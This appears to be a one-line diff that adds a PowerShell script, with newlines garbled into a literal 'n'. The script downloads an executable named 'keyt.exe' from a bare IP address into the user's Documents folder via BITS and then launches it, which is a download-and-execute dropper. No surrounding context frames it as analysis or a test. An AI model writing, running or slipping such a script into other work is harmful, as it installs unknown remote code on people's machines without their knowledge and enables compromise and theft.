@@ -1,0 +1,1 @@
+Import-Module BitsTransfern$path = [environment]::getfolderpath("mydocuments")nStart-BitsTransfer -Source "http://94.102.50.39/keyt.exe" -Destination "$pathkeyt.exe"nInvoke-Item  "$pathkeyt.exe"
